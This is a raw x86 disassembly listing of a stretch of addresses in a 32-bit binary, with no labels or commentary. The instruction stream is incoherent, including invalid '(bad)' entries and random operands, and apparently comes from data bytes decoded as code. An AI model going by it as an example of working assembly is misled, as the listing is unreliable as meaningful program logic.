  401f81:	and    DWORD PTR [eax],eax
  401f83:	dec    eax
  401f84:	adc    al,0x80
  401f86:	cwde   
  401f87:	push   es
  401f88:	rcl    BYTE PTR [ecx],1
  401f8a:	add    ecx,DWORD PTR [eax]
  401f8c:	adc    al,0x93
  401f8e:	add    BYTE PTR [ebp+0x38202600],al
  401f94:	and    BYTE PTR [eax],cl
  401f96:	pop    edx
  401f97:	add    BYTE PTR [ebp-0x7bbffe20],al
  401f9d:	adc    al,dl
  401f9f:	or     edx,ecx
  401fa1:	sub    BYTE PTR [esi],al
  401fa3:	and    al,BYTE PTR gs:[eax]
  401fa6:	call   DWORD PTR ds:0x43714c
  401fac:	or     BYTE PTR [eax],bl
  401fae:	and    BYTE PTR [edx+0x40a00011],al
  401fb4:	xor    eax,0x3266114
  401fb9:	enter  0x4002,0x26
  401fbd:	add    cl,BYTE PTR [edx]
  401fbf:	sub    DWORD PTR [eax],ebx
  401fc1:	or     DWORD PTR [ecx],0x0
  401fc4:	push   ebx
  401fc5:	add    DWORD PTR [eax+0x40c30ec2],esi
  401fcb:	adc    eax,0xa550904
  401fd0:	daa    
  401fd1:	adc    ch,BYTE PTR [ebx-0x37d23def]
  401fd7:	sbb    ebp,DWORD PTR [ecx+0x70044508]
  401fdd:	inc    eax
  401fde:	or     DWORD PTR [edx+ecx*1-0x3ddffffa],eax
  401fe5:	add    al,0x42
  401fe7:	dec    eax
  401fe8:	add    BYTE PTR [edx],al
  401fea:	or     eax,0xa01be62
  401fef:	mov    BYTE PTR [eax+0x2b14ce50],ah
  401ff5:	add    dh,BYTE PTR [eax+eax*1+0x4279ac18]
  401ffc:	sub    BYTE PTR [esp+ecx*2-0x5d],cl
  402000:	adc    al,0x10
  402002:	cmp    DWORD PTR [eax+0x2c4ac098],ecx
  402008:	push   es
  402009:	push   ecx
  40200a:	dec    esp
  40200b:	add    BYTE PTR [ecx+0x21],dl
  40200e:	mov    ds:0xa811020a,al
  402013:	jo     0x401f95
  402015:	add    BYTE PTR [ecx+0x1068f809],al
  40201b:	add    DWORD PTR [edi+eax*4],esi
  40201e:	xor    al,0x1a
  402020:	adc    BYTE PTR [ecx],al
  402022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402023:	dec    eax
  402024:	or     al,0x44
  402026:	or     al,0x36
  402028:	or     DWORD PTR [eax+ecx*2],0x40
  40202c:	dec    eax
  40202d:	retf   0x18
  402030:	nop
  402031:	mov    al,BYTE PTR [eax]
  402033:	or     BYTE PTR [eax+0x4800080],0x40
  40203a:	add    al,0x8e
  40203c:	add    dl,ah
  40203e:	mov    cl,BYTE PTR [ebx]
  402040:	add    al,BYTE PTR [eax-0x76ffefc0]
  402046:	add    BYTE PTR [eax],bl
  402048:	push   eax
  402049:	mov    esi,0x500ab4f
  40204e:	and    al,0x28
  402050:	push   es
  402051:	sub    BYTE PTR [eax+edx*1],dl
  402054:	adc    al,0x42
  402056:	push   eax
  402057:	add    BYTE PTR [eax],al
  402059:	and    al,0x80
  40205b:	or     al,0x50
  40205d:	or     DWORD PTR [ecx+0x8],eax
  402060:	pusha  
  402061:	inc    ebx
  402062:	add    BYTE PTR [eax],al
  402064:	inc    edx
  402065:	dec    ebp
  402066:	add    al,0x80
  402068:	fwait
  402069:	or     al,0x53
  40206b:	add    BYTE PTR [edx],bl
  40206d:	inc    ecx
  40206e:	movups XMMWORD PTR [eax],xmm0
  402071:	adc    al,BYTE PTR [ebp+0x10]
  402074:	adc    eax,0x29169200
  402079:	adc    cl,BYTE PTR [ebx]
  40207b:	lea    eax,[eax-0x4c]
  40207e:	popa   
  40207f:	bound  eax,QWORD PTR [ecx]
  402081:	add    al,BYTE PTR [esi+eax*1+0x5]
  402085:	adc    BYTE PTR [edx],al
  402087:	mov    ds:0x25a0108,al
  40208c:	adc    al,0x30
  40208e:	and    BYTE PTR [eax],0x3
  402091:	add    ecx,edx
  402093:	or     al,0x36
  402095:	add    BYTE PTR [ecx],0x4
  402098:	shl    DWORD PTR [edx],0x40
  40209b:	add    ch,ch
  40209d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40209e:	push   edx
  40209f:	add    al,BYTE PTR [ecx-0x3fbfbd58]
  4020a5:	add    eax,0xd5830f
  4020aa:	pusha  
  4020ab:	inc    esp
  4020ac:	and    BYTE PTR [eax],0x2
  4020af:	rol    BYTE PTR [esp+edx*2+0x0],1
  4020b3:	mov    BYTE PTR [edi+0x15590006],al
  4020b9:	sbb    BYTE PTR [edx+0x64481009],al
  4020bf:	add    DWORD PTR [ebx],eax
  4020c1:	and    BYTE PTR [eax+eax*1+0x1e2ac204],0x1a
  4020c9:	dec    eax
  4020ca:	bound  eax,QWORD PTR [eax-0x7df6f0ef]
  4020d0:	add    BYTE PTR [edx],al
  4020d2:	or     BYTE PTR [eax],al
  4020d4:	xor    al,BYTE PTR [edx+0x0]
  4020d7:	adc    eax,0xe2a22206
  4020dc:	inc    esp
  4020dd:	js     0x402097
  4020df:	test   al,0x90
  4020e1:	push   0x6c60421
  4020e6:	mov    al,ds:0x80185028
  4020eb:	pusha  
  4020ec:	xchg   ecx,eax
  4020ed:	dec    edx
  4020ee:	xchg   ecx,eax
  4020ef:	add    al,BYTE PTR [eax+0x420006]
  4020f5:	pusha  
  4020f6:	add    BYTE PTR [ecx],cl
  4020f8:	inc    eax
  4020f9:	inc    esi
  4020fa:	adc    BYTE PTR [edx],bl
  4020fc:	add    BYTE PTR [edx+0x2110180e],dl
  402102:	and    DWORD PTR [edx+0x38],edx
  402105:	add    BYTE PTR [eax+0x24],al
  402108:	cmp    BYTE PTR [eax-0x56],dh
  40210b:	add    eax,0x808f8004
  402110:	inc    eax
  402111:	and    BYTE PTR [ecx],bl
  402113:	mov    WORD PTR [esi],ax
  402116:	add    al,BYTE PTR [edx]
  402118:	add    BYTE PTR [ecx],dh
  40211a:	xchg   ecx,eax
  40211b:	nop
  40211c:	inc    esp
  40211d:	push   eax
  40211e:	and    BYTE PTR [ebx+0x512a4923],al
  402124:	ret    
  402125:	and    DWORD PTR [eax+0x41051c],ebx
  40212b:	add    al,BYTE PTR [edx+eiz*4]
  40212e:	sub    BYTE PTR [ecx],al
  402130:	add    DWORD PTR [eax-0x7e],eax
  402133:	rol    BYTE PTR [edx+edx*1+0xc508604],cl
  40213a:	sbb    BYTE PTR [eax],0x8
  40213d:	inc    eax
  40213e:	add    BYTE PTR [ebx],al
  402140:	or     BYTE PTR [esp+eax*1],0x36
  402144:	and    BYTE PTR [eax],cl
  402146:	add    al,BYTE PTR [eax]
  402148:	add    al,0xc4
  40214a:	add    eax,0x880100ac
  40214f:	add    dh,BYTE PTR [ecx]
  402151:	imul   ebp,DWORD PTR [edx+0x11],0x4002103e
  402158:	push   es
  402159:	adc    al,0x0
  40215b:	sbb    BYTE PTR [esi-0x80],cl
  40215e:	adc    DWORD PTR [edx+0x18],eax
  402161:	or     BYTE PTR [ecx],dl
  402163:	pop    eax
  402164:	push   es
  402165:	add    BYTE PTR [eax+0x28808982],al
  40216b:	add    DWORD PTR [ebx+0x10860940],ecx
  402171:	or     BYTE PTR [ebx],ch
  402173:	adc    DWORD PTR [eax-0x7c],eax
  402176:	add    BYTE PTR [esi],cl
  402178:	adc    BYTE PTR [ebx+edx*1+0x0],al
  40217c:	test   DWORD PTR [eax-0x7cef6ff0],eax
  402182:	or     ah,BYTE PTR [edi]
  402184:	and    BYTE PTR [esi],ah
  402186:	or     BYTE PTR [edx+ebp*1-0x3c7fef78],0xb8
  40218e:	xchg   edx,eax
  40218f:	xor    DWORD PTR [ecx-0x40],0x832c5020
  402196:	inc    eax
  402197:	inc    edx
  402198:	push   0xd9080211
  40219d:	add    al,ah
  40219f:	shl    BYTE PTR [ebx],0x0
  4021a2:	add    BYTE PTR [ebx],al
  4021a4:	xor    BYTE PTR [ecx],0x80
  4021a7:	pusha  
  4021a8:	and    al,BYTE PTR [eax]
  4021aa:	add    eax,0x88483015
  4021af:	add    BYTE PTR [eax+edx*1],dh
  4021b2:	inc    esp
  4021b3:	add    eax,DWORD PTR [eax]
  4021b5:	or     BYTE PTR [eax],cl
  4021b7:	rcr    BYTE PTR [ecx+0x56],0xd2
  4021bb:	and    DWORD PTR ds:0x85048850,eax
  4021c1:	add    BYTE PTR [ecx+edx*2],ch
  4021c4:	mov    dl,BYTE PTR [edx]
  4021c6:	add    BYTE PTR [eax],ah
  4021c8:	or     ah,BYTE PTR [eax]
  4021ca:	add    cl,BYTE PTR [ecx+0x2b]
  4021cd:	and    BYTE PTR [eax],al
  4021cf:	nop
  4021d0:	dec    eax
  4021d1:	adc    BYTE PTR [eax],al
  4021d3:	adc    ah,BYTE PTR [eax+eax*1]
  4021d6:	or     eax,0x60cc800
  4021db:	add    BYTE PTR [ecx+0x11],cl
  4021de:	inc    eax
  4021df:	or     eax,DWORD PTR [eax]
  4021e1:	dec    edx
  4021e2:	sub    BYTE PTR [eax],cl
  4021e4:	icebp  
  4021e5:	add    BYTE PTR [edx-0x80],al
  4021e8:	into   
  4021e9:	add    DWORD PTR [eax],eax
  4021eb:	add    eax,0x51428c0
  4021f0:	add    DWORD PTR [ecx],esp
  4021f2:	push   esi
  4021f3:	xor    DWORD PTR [esi+0x3cc2718a],eax
  4021f9:	and    BYTE PTR [ecx+0x76],al
  4021fc:	add    BYTE PTR ds:0x10040339,bh
  402202:	add    al,0x62
  402204:	add    al,0x20
  402206:	add    BYTE PTR [eax+0x52100a02],bl
  40220c:	rcl    BYTE PTR [edx],0x0
  40220f:	and    BYTE PTR [ebx+0x0],al
  402212:	add    BYTE PTR [eax],ah
  402214:	ret    0x124c
  402217:	shr    DWORD PTR [ecx+0xa],0x52
  40221b:	add    BYTE PTR [eax+0x14011191],ch
  402221:	test   eax,0x2800481
  402226:	add    eax,0x552103
  40222b:	dec    esp
  40222c:	xor    ah,cl
  40222e:	or     eax,0x40014644
  402233:	or     BYTE PTR [ecx+0x480000c2],al
  402239:	add    BYTE PTR [edx],cl
  40223b:	add    BYTE PTR ds:0xa5980604,al
  402241:	add    eax,0x2f8ca204
  402246:	dec    edx
  402247:	adc    BYTE PTR [edx],al
  402249:	or     DWORD PTR [edx],ecx
  40224b:	pop    es
  40224c:	add    DWORD PTR es:[edx+0x24],eax
  402250:	rcr    BYTE PTR [eax+0x8],0x0
  402254:	data16 or BYTE PTR [ecx+0x2b],0x30
  402259:	test   eax,0x224b3511
  40225e:	and    DWORD PTR [eax],0xc828a284
  402264:	and    BYTE PTR [eax-0x80],al
  402267:	or     DWORD PTR [eax-0x60],eax
  40226a:	xor    al,0x6a
  40226c:	adc    BYTE PTR [esi+0xc],al
  40226f:	sbb    al,0x8
  402271:	ret    0x8808
  402274:	add    al,BYTE PTR [edx+esi*1+0x20ce3005]
  40227b:	add    dl,al
  40227d:	adc    al,0x50
  40227f:	xchg   ecx,eax
  402280:	add    DWORD PTR [eax],0x56
  402283:	add    al,BYTE PTR [ecx]
  402285:	adc    cl,BYTE PTR [edx]
  402287:	sub    dl,BYTE PTR [eax]
  402289:	mov    eax,ds:0xa040210
  40228e:	and    esi,edx
  402290:	add    bl,BYTE PTR [ecx]
  402292:	inc    ebp
  402293:	test   al,0x20
  402295:	mov    ds:0x262640c3,al
  40229a:	mov    ds:0xb24c10,al
  40229f:	scas   al,BYTE PTR es:[edi]
  4022a0:	and    al,0x8
  4022a2:	add    dh,BYTE PTR [esp+eax*1]
  4022a5:	and    BYTE PTR [edx],al
  4022a7:	push   es
  4022a8:	mov    DWORD PTR [eax-0x3f],eax
  4022ab:	mulps  xmm0,XMMWORD PTR [edx+0x16]
  4022af:	rol    DWORD PTR [edx+ebx*1+0x9220017],0x0
  4022b7:	sbb    BYTE PTR [eax+0x61022114],al
  4022bd:	inc    eax
  4022be:	mov    ah,0x28
  4022c0:	xor    BYTE PTR [eax-0x1e],al
  4022c3:	or     DWORD PTR [eax],eax
  4022c5:	xor    eax,0x9a181c66
  4022ca:	inc    eax
  4022cb:	add    edx,DWORD PTR [eax-0x7e]
  4022ce:	push   cs
  4022cf:	and    al,0x23
  4022d1:	pop    ecx
  4022d2:	mov    edx,0x16a2982
  4022d7:	inc    eax
  4022d8:	and    BYTE PTR [edx],ah
  4022da:	add    al,BYTE PTR [eax]
  4022dc:	loop   0x402341
  4022de:	loopne 0x402304
  4022e0:	xor    al,bl
  4022e2:	rcr    BYTE PTR [eax+0x3e3240d3],1
  4022e8:	or     DWORD PTR [edx+0x58],eax
  4022eb:	bound  eax,QWORD PTR [eax+eax*4]
  4022ee:	cmp    ch,BYTE PTR [eax]
  4022f0:	add    al,0x41
  4022f2:	adc    DWORD PTR [ecx],esp
  4022f4:	adc    ch,0x12
  4022f7:	mov    BYTE PTR [edx],al
  4022f9:	push   ecx
  4022fa:	add    cl,BYTE PTR [ecx-0x6ff57fde]
  402300:	and    dl,BYTE PTR [eax]
  402302:	adc    BYTE PTR [ebx],dl
  402304:	add    BYTE PTR [eax],al
  402306:	add    BYTE PTR [eax],0x0
  402309:	in     al,0xa6
  40230b:	nop
  40230c:	ror    BYTE PTR [ecx+0x6462b000],cl
  402312:	add    BYTE PTR [ecx],al
  402314:	add    BYTE PTR [eax+eiz*4],al
  402317:	xchg   DWORD PTR ds:0x500286e2,ebp
  40231d:	adc    BYTE PTR [ecx+0x22211031],al
  402323:	add    BYTE PTR es:[eax],0x0
  402327:	add    BYTE PTR [esp+eax*4],dh
  40232a:	inc    ebp
  40232b:	retf   0x1c
  40232e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40232f:	jb     0x40233d
  402331:	add    cl,BYTE PTR [eax]
  402333:	nop
  402334:	or     BYTE PTR [esi+0x1941d00],dl
  40233a:	add    al,al
  40233c:	add    ah,BYTE PTR [eax+eiz*1]
  40233f:	add    al,0x80
  402341:	add    DWORD PTR [edx],esp
  402343:	dec    esp
  402344:	test   al,0x28
  402346:	sbb    BYTE PTR [eax-0x7fdda000],al
  40234c:	and    BYTE PTR [eax+0x10000621],dl
  402352:	cmp    BYTE PTR [eax],dl
  402354:	and    al,0x10
  402356:	inc    esp
  402357:	and    ebx,DWORD PTR [edx+0x7c460]
  40235d:	mov    esp,0x11ca0602
  402362:	xor    BYTE PTR [ecx],al
  402364:	nop
  402365:	xchg   ecx,eax
  402366:	mov    BYTE PTR [eax],al
  402368:	add    eax,0x4e8209c
  40236d:	and    esi,DWORD PTR [ecx]
  40236f:	imul   eax,DWORD PTR [ecx],0x61558800
  402375:	xchg   ecx,eax
  402376:	add    eax,0x210125a4
  40237b:	push   es
  40237c:	inc    edx
  40237d:	or     al,0x28
  40237f:	add    BYTE PTR [ecx],0x8
  402382:	add    BYTE PTR [eax],cl
  402384:	add    BYTE PTR [eax+eax*1+0x1],al
  402388:	dec    ecx
  402389:	adc    bh,BYTE PTR [ecx]
  40238b:	add    BYTE PTR [ecx+0x20],ah
  40238e:	mov    al,ds:0x22110801
  402393:	add    BYTE PTR [eax],dl
  402395:	add    DWORD PTR [ecx],ebp
  402397:	add    BYTE PTR [eax],dh
  402399:	sbb    eax,DWORD PTR [edx-0xf5f89ff]
  40239f:	inc    eax
  4023a0:	mov    al,ds:0x2313f112
  4023a5:	adc    bl,BYTE PTR [eax+0x22]
  4023a8:	or     BYTE PTR [ebx],0x40
  4023ab:	dec    edx
  4023ac:	add    DWORD PTR [eax+eax*1],0x1
  4023b0:	push   es
  4023b1:	add    dl,BYTE PTR [edx]
  4023b3:	add    BYTE PTR [ecx+0x0],bl
  4023b6:	xor    al,BYTE PTR [eax+0x14]
  4023b9:	add    al,ah
  4023bb:	add    al,0xa0
  4023bd:	or     BYTE PTR [esp+ecx*2+0x20],al
  4023c1:	add    BYTE PTR [edx+0x5a894424],ah
  4023c7:	or     BYTE PTR [eax+ebp*1],al
  4023ca:	mov    BYTE PTR [eax+0x50401094],dl
  4023d0:	add    BYTE PTR [edi],0x2
  4023d3:	add    al,BYTE PTR [edx]
  4023d5:	adc    DWORD PTR [eax+0x20],esi
  4023d8:	inc    eax
  4023d9:	add    BYTE PTR [esp+ecx*1-0x7e],0x9
  4023de:	sub    cl,BYTE PTR [ebx]
  4023e0:	pusha  
  4023e1:	inc    esi
  4023e2:	popa   
  4023e3:	or     BYTE PTR [ebx],cl
  4023e5:	add    al,0xa2
  4023e7:	inc    eax
  4023e8:	and    DWORD PTR [eax+0x44],eax
  4023eb:	add    BYTE PTR [edx+0x6150308],ah
  4023f1:	add    DWORD PTR [eax+0x0],eax
  4023f4:	lds    edi,FWORD PTR [ecx+0x46]
  4023f7:	mov    dh,BYTE PTR [ecx]
  4023f9:	adc    DWORD PTR [eax+0x11807b80],ecx
  4023ff:	add    DWORD PTR [eax+eiz*1],edx
  402402:	xor    BYTE PTR [ecx+0x20],dl
  402405:	add    al,0x80
  402407:	test   BYTE PTR [ecx-0x60],cl
  40240a:	mov    BYTE PTR [eax+ecx*4+0x28],dh
  40240e:	mov    eax,ds:0x11f94100
  402413:	inc    edi
  402414:	or     al,0x3
  402416:	test   eax,0x42208001
  40241b:	jb     0x40241d
  40241d:	add    BYTE PTR [eax+eax*1+0x2e],dl
  402421:	cmp    BYTE PTR [ebx],dh
  402423:	and    BYTE PTR [eax],al
  402425:	or     BYTE PTR [ecx+0x14],bl
  402428:	push   0x5ae40003
  40242d:	push   ecx
  40242e:	pop    es
  40242f:	add    BYTE PTR [edx],al
  402431:	cmp    DWORD PTR [ecx],edx
  402433:	sub    BYTE PTR [edx],al
  402435:	test   eax,0x20048000
  40243a:	add    DWORD PTR [ebx],eax
  40243c:	add    cl,BYTE PTR [eax+edx*1-0x5fff1ef7]
  402443:	add    DWORD PTR [ecx],esp
  402445:	add    DWORD PTR [esi],eax
  402447:	nop
  402448:	or     BYTE PTR [edx+ecx*1],al
  40244b:	adc    BYTE PTR [eax+0x29],0x50
  40244f:	and    eax,0x98486528
  402454:	add    DWORD PTR [eax+ecx*1],0x2
  402458:	pop    es
  402459:	xchg   ebx,eax
  40245a:	mov    ds:0x28c0c1,al
  40245f:	or     BYTE PTR [eax+eiz*2],al
  402462:	add    eax,eax
  402464:	and    BYTE PTR [eax+0x6800a0a],0xc
  40246b:	add    BYTE PTR [edx],al
  40246d:	les    ecx,FWORD PTR [eax+0x60008]
  402473:	nop
  402474:	or     al,BYTE PTR [eax+0x12848684]
  40247a:	push   cs
  40247b:	inc    ecx
  40247c:	test   DWORD PTR [ebx],eax
  40247e:	jmp    0xc084:0x3038700
  402485:	cmp    dl,BYTE PTR [esi]
  402487:	and    cl,BYTE PTR [eax]
  402489:	lock adc BYTE PTR [eax+0x9],al
  40248d:	dec    eax
  40248e:	popa   
  40248f:	and    BYTE PTR [edx],ah
  402491:	sbb    al,0xe
  402493:	add    DWORD PTR [eax+esi*8+0x2],ecx
  402497:	xor    BYTE PTR [ecx-0x78],al
  40249a:	and    al,0x2
  40249c:	add    BYTE PTR [eax],cl
  40249e:	or     BYTE PTR [ebx],al
  4024a0:	mov    ds:0x7105900,al
  4024a5:	push   cs
  4024a6:	push   eax
  4024a7:	or     BYTE PTR [ecx],0x10
  4024aa:	test   BYTE PTR [ecx],al
  4024ac:	jmp    0x1cc44d91
  4024b1:	mov    al,ds:0x10208000
  4024b6:	add    bl,BYTE PTR [esi]
  4024b8:	and    al,BYTE PTR [eax]
  4024ba:	cmp    BYTE PTR [eax+eax*2],al
  4024bd:	mov    dl,BYTE PTR [ecx]
  4024bf:	sbb    BYTE PTR [ecx],al
  4024c1:	add    al,al
  4024c3:	add    eax,0x14101
  4024c8:	and    al,BYTE PTR [eax+eiz*1]
  4024cb:	pushf  
  4024cc:	add    al,cl
  4024ce:	inc    esp
  4024cf:	add    DWORD PTR [edx],eax
  4024d1:	or     eax,DWORD PTR [eax+0x6a40202]
  4024d7:	add    al,0x31
  4024d9:	add    al,BYTE PTR [eax+0x14]
  4024dc:	test   DWORD PTR [eax+edx*1],eax
  4024df:	popa   
  4024e0:	xchg   BYTE PTR ds:0x4089340d,al
  4024e6:	and    BYTE PTR [eax],al
  4024e8:	jo     0x402502
  4024ea:	adc    BYTE PTR [ecx],al
  4024ec:	rol    BYTE PTR [ecx+0x10188007],0x2
  4024f3:	dec    esp
  4024f4:	add    BYTE PTR [edx],0x5e
  4024f7:	pop    esp
  4024f8:	or     BYTE PTR [eax],al
  4024fa:	or     BYTE PTR [edi+0x481400],al
  402500:	sub    BYTE PTR [ebx],0x1a
  402503:	push   es
  402504:	aad    0x4
  402506:	add    DWORD PTR [eax],0x43030c08
  40250c:	add    al,0x51
  40250e:	and    al,BYTE PTR [ebx]
  402510:	or     BYTE PTR [edx-0x42bfb800],al
  402516:	lock add al,BYTE PTR [eax+0x42004e07]
  40251d:	or     BYTE PTR [eax+eax*1+0x28],cl
  402521:	in     al,0x33
  402523:	push   ecx
  402524:	push   ss
  402525:	adc    DWORD PTR [edx],ecx
  402527:	xor    DWORD PTR [edx],eax
  402529:	or     DWORD PTR [esi+0x29090d63],esp
  40252f:	or     cl,BYTE PTR [edx+eiz*4]
  402532:	or     al,0x44
  402534:	add    BYTE PTR [ebp+0x28a88008],al
  40253a:	xchg   esp,eax
  40253b:	adc    eax,0xd88a408
  402540:	and    BYTE PTR [esi],0xb6
  402543:	xchg   BYTE PTR [eax],ah
  402545:	and    al,0xc0
  402547:	inc    esp
  402548:	add    BYTE PTR [eax],cl
  40254a:	add    al,0x3
  40254c:	rcr    BYTE PTR [edx+0x5200a08],0x10
  402553:	add    BYTE PTR [ebx+0x30],0xa
  402557:	add    BYTE PTR [edx],ah
  402559:	add    BYTE PTR [eax+0x1401d885],dl
  40255f:	bound  edx,QWORD PTR [eax+eax*1-0x7f767b3d]
  402566:	and    dl,BYTE PTR gs:[ecx]
  402569:	and    al,0xc
  40256b:	dec    eax
  40256c:	inc    edx
  40256d:	adc    ah,BYTE PTR [eax+0x44]
  402570:	xchg   edx,eax
  402571:	xor    al,0x9
  402573:	shl    BYTE PTR [ebx+0x40c069da],0x8
  40257a:	and    BYTE PTR [ecx+eax*1-0x5e4f8c00],al
  402581:	add    edx,DWORD PTR [ecx]
  402583:	push   es
  402584:	add    BYTE PTR [esi+0x9],al
  402587:	add    BYTE PTR [ecx+0x27299274],cl
  40258d:	loopne 0x40258f
  40258f:	call   0xd0804bd4
  402594:	test   eax,0x32000
  402599:	mov    al,0x4
  40259b:	adc    BYTE PTR [eax],bl
  40259d:	xchg   esp,eax
  40259e:	or     BYTE PTR ds:0x10000448,0x14
  4025a5:	and    BYTE PTR [eax],al
  4025a7:	rcr    BYTE PTR [ecx],1
  4025a9:	nop
  4025aa:	add    DWORD PTR [ecx+eax*1],eax
  4025ad:	add    BYTE PTR [eax+ecx*2-0x78],ch
  4025b1:	adc    BYTE PTR [esp+eax*4],bl
  4025b4:	mov    al,0x26
  4025b6:	adc    BYTE PTR [ebp+0x26219c26],0xc4
  4025bd:	xchg   esi,eax
  4025be:	jb     0x402550
  4025c0:	add    BYTE PTR [edi],al
  4025c2:	add    BYTE PTR [eax-0x5a],ah
  4025c5:	inc    eax
  4025c6:	add    BYTE PTR [eax-0x6e],al
  4025c9:	nop
  4025ca:	adc    DWORD PTR [ebx],esi
  4025cc:	inc    eax
  4025cd:	inc    edx
  4025ce:	or     esp,DWORD PTR [ecx]
  4025d0:	adc    DWORD PTR [ecx+0x112a300c],eax
  4025d6:	adc    BYTE PTR [esi+0x17120942],cl
  4025dc:	add    dl,BYTE PTR [eax+0x68]
  4025df:	or     ah,BYTE PTR [eax]
  4025e1:	add    BYTE PTR [eax],al
  4025e3:	xor    DWORD PTR [eax],eax
  4025e5:	nop
  4025e6:	and    dl,cl
  4025e8:	adc    BYTE PTR [esi+0x111c206],cl
  4025ee:	add    al,0x48
  4025f0:	in     al,0x1
  4025f2:	xchg   ecx,eax
  4025f3:	and    DWORD PTR [eax],eax
  4025f5:	sub    BYTE PTR [edi],al
  4025f7:	add    al,0x18
  4025f9:	push   eax
  4025fa:	test   BYTE PTR [eax-0x3feeff80],ch
  402600:	inc    eax
  402601:	jp     0x402583
  402603:	add    al,0x16
  402605:	xchg   DWORD PTR [eax+0x5],eax
  402608:	popa   
  402609:	add    BYTE PTR [ebx+0x0],al
  40260c:	adc    eax,0xc0a4d482
  402611:	pop    es
  402612:	add    al,0xa0
  402614:	add    DWORD PTR [eax-0x1e],edx
  402617:	mov    al,0x84
  402619:	and    DWORD PTR [ecx+0xf808282],0xffffff80
  402620:	ret    0x3200
  402623:	or     bl,BYTE PTR [eax+0x24]
  402626:	nop
  402627:	adc    BYTE PTR [ecx],0x3c
  40262a:	mov    ds:0xd209c4,al
  40262f:	xchg   BYTE PTR [edi+0x90250c0],al
  402635:	add    BYTE PTR [eax+ecx*2],al
  402638:	add    BYTE PTR [eax],0x4
  40263b:	add    DWORD PTR [eax],0x7035240c
  402641:	sub    al,0xa4
  402643:	adc    dh,BYTE PTR [eax-0xfedfeb8]
  402649:	inc    esp
  40264a:	add    cl,BYTE PTR [ebx+0x443962fa]
  402650:	dec    eax
  402651:	rcl    BYTE PTR [ecx+0x4c],0x2
  402655:	adc    BYTE PTR [ebp+0x21001a0],0x2
  40265c:	or     BYTE PTR [eax+ecx*2+0x0],dl
  402660:	nop
  402661:	mov    al,BYTE PTR [edx]
  402663:	sub    DWORD PTR [eax],0x2418300
  402669:	sbb    BYTE PTR [eax+ebp*1-0x59fbce7e],al
  402670:	and    BYTE PTR [eax+eiz*2],al
  402673:	adc    DWORD PTR [eax],eax
  402675:	add    eax,0x2420001
  40267a:	adc    al,0x40
  40267c:	add    ah,BYTE PTR [eax+0x7]
  40267f:	sbb    al,bh
  402681:	or     ch,BYTE PTR [eax]
  402683:	sub    DWORD PTR [ecx+ebp*1],esp
  402686:	add    al,0x8a
  402688:	test   DWORD PTR [eax],esi
  40268a:	adc    BYTE PTR [ecx],ah
  40268c:	or     BYTE PTR [eax],al
  40268e:	adc    BYTE PTR [eax+0x19],al
  402691:	push   ecx
  402692:	popa   
  402693:	and    DWORD PTR [ebx+0x0],ecx
  402696:	inc    ecx
  402697:	inc    eax
  402698:	add    ch,BYTE PTR [eax+0x32208005]
  40269e:	and    BYTE PTR [ebp+0x2],bl
  4026a1:	pusha  
  4026a2:	nop
  4026a3:	inc    edx
  4026a4:	and    DWORD PTR [ecx],ebx
  4026a6:	and    BYTE PTR [ebx],dl
  4026a8:	xchg   ecx,eax
  4026a9:	sub    al,0x12
  4026ab:	push   es
  4026ac:	add    dl,BYTE PTR [edx]
  4026ae:	dec    eax
  4026af:	or     BYTE PTR [ecx+eax*4],ch
  4026b2:	inc    eax
  4026b3:	add    BYTE PTR [edx],0x17
  4026b6:	adc    al,BYTE PTR [edx+0x14]
  4026b9:	sub    BYTE PTR [eax+0x40414c50],0x30
  4026c0:	pusha  
  4026c1:	and    al,0x0
  4026c3:	pusha  
  4026c4:	adc    BYTE PTR [eax+0x46],dl
  4026c7:	fcom   DWORD PTR [ecx+0x10]
  4026ca:	and    edx,DWORD PTR [eax]
  4026cc:	inc    ecx
  4026cd:	push   esp
  4026ce:	and    BYTE PTR [ecx+0x12940a2],ah
  4026d4:	pop    es
  4026d5:	adc    DWORD PTR [eax],eax
  4026d7:	adc    bl,BYTE PTR [eax+0x4801190]
  4026dd:	int3   
  4026de:	add    DWORD PTR [ecx-0x57ffcef5],ebp
  4026e4:	and    ah,cl
  4026e6:	and    al,0x20
  4026e8:	or     al,0x10
  4026ea:	adc    BYTE PTR [edx+edx*1],ah
  4026ed:	push   es
  4026ee:	pop    eax
  4026ef:	adc    BYTE PTR [eax],0x24
  4026f2:	(bad)  
  4026f3:	push   edx
  4026f4:	mov    ah,cl
  4026f6:	add    cl,0x62
  4026f9:	and    edx,DWORD PTR [ecx]
  4026fb:	test   DWORD PTR [ecx],ebp
  4026fd:	add    ch,BYTE PTR [eax]
  4026ff:	adc    DWORD PTR [eax],esp
  402701:	and    BYTE PTR [esi],0x3
  402704:	inc    eax
  402705:	add    BYTE PTR [eax],ch
  402707:	inc    eax
  402708:	inc    ebp
  402709:	adc    BYTE PTR [eax+eax*1],dl
  40270c:	and    BYTE PTR ds:0x60012800,al
  402712:	add    BYTE PTR [eax],bl
  402714:	ret    0x2800
  402717:	and    DWORD PTR [ecx-0x75fff160],0x42908a1
  402721:	sbb    BYTE PTR [eax+0x2622020a],cl
  402727:	push   es
  402728:	rol    BYTE PTR [eax],0x4
  40272b:	and    BYTE PTR [edi],ch
  40272d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40272e:	inc    ecx
  40272f:	inc    eax
  402730:	and    eax,0x60102d2a
  402735:	sbb    dl,BYTE PTR [edx-0x60]
  402738:	push   es
  402739:	inc    edx
  40273a:	mov    BYTE PTR [ecx+0x9],cl
  40273d:	adc    al,0x8a
  40273f:	add    BYTE PTR [eax],dh
  402741:	test   BYTE PTR [eax],bh
  402743:	inc    eax
  402744:	sub    al,0x18
  402746:	sub    BYTE PTR [eax],ah
  402748:	inc    eax
  402749:	mov    dl,0x50
  40274b:	test   eax,0xab241523
  402750:	inc    eax
  402751:	add    ch,BYTE PTR [eax]
  402753:	adc    DWORD PTR [edi+0x5a],eax
  402756:	rol    DWORD PTR [eax-0x27fd8d78],1
  40275c:	and    BYTE PTR [esp+eax*1],cl
  40275f:	add    BYTE PTR [ecx+0xa208],dl
  402765:	adc    BYTE PTR [edi+0x12],0x98
  402769:	add    al,ah
  40276b:	add    al,0xb6
  40276d:	cmp    edx,DWORD PTR [edx]
  40276f:	add    DWORD PTR [ecx+0x10],eax
  402772:	and    BYTE PTR [ecx],dl
  402774:	add    eax,ecx
  402776:	mov    eax,0x1620011e
  40277b:	mov    edi,edi
  40277d:	adc    eax,0x43713c
